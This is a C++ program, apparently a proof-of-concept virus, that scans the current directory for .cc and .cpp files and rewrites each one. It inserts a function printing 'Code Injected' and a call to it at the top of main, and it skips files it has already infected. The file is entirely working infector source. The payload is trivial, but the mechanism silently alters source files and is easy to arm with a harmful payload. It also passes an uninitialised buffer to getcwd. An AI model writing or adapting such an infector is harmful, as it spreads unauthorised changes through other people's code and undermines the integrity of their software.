#include <dirent.h> 
#include <unistd.h>
#include <fstream>

int main(void)
{
    DIR *dirp;
    struct dirent *directory;
    char *buf;
    /* opens current working directory (Only injects code into current working directory) */ 
    dirp = opendir(getcwd(buf, 500));
    /* Checks to make sure the directory is valid */
    if (dirp){
        /* Gets the names and types of all the files in the Directory */
        while ((directory = readdir(dirp)) != NULL){
            std::string fn(directory->d_name);
            /* Checks to see if it is a .cc or .cpp file aka a C++ file */
            if(fn.substr(fn.find_last_of(".") + 1) == "cc" || fn.substr(fn.find_last_of(".") + 1) == "cpp") {
                /* This will be the payload being injected into the file */
                std::string injectedCode = "";
                /* Opens .cc or .cpp file */
                std::ifstream infile(fn);
                /* Used to place the payload into the correct spot */
                int counter = 0;
                /* Checks to see if .cc file has already been infected */
                bool flag = true;
                /* each line of the file */
                std::string line;
                /* Gets the contents of a file line by line */
                while ( getline (infile,line)){
                    /* Trys to find the main */
                    if(flag && (line.compare("int main(void)") == 0 || line.compare("int main()") == 0 || line.compare("main()") == 0)){
                        /* injecting payload function */
                        injectedCode = injectedCode + "void additionCheck() { printf(\"Code Injected\"); }\n";
                        counter++;
                    }
                    if(line.compare("void additionCheck() { printf(\"Code Injected\"); }") == 0){
                        /* File already injected */
                        flag = false; 
                    }
                    if(flag && (line.compare("int main(){") == 0 || line.compare("int main(void){") == 0 || line.compare("int main(void) {") == 0 || line.compare("int main() {") == 0)){
                        /* injecting payload function */
                        injectedCode = injectedCode + "void additionCheck() { printf(\"Code Injected\"); }\n";
                        /* ensuring that we go into the nextif statment */
                        counter = -1;
                    }
                    /* Adds old line of code to injected code */
                    injectedCode = injectedCode + line + "\n";
                    if(((counter == 1 && line.compare("{") == 0) || counter == -1) && flag){
                        /* injecting call to payload */ 
                        injectedCode = injectedCode + "additionCheck();\n";
                        /* Changing the flag to false to make sure it doesnt add anymore code */
                        flag = false;
                    }
                }
                /* Closes infile */
                infile.close();
                /* creating a ofstream to be able to write to a file */
                std::ofstream outfile(fn);
                /* Writes to file */
                outfile << injectedCode;
                /* Closes outfile */
                outfile.close();
            }
        }
        /* close directory */
        closedir(dirp);
    }
    return(0);
}
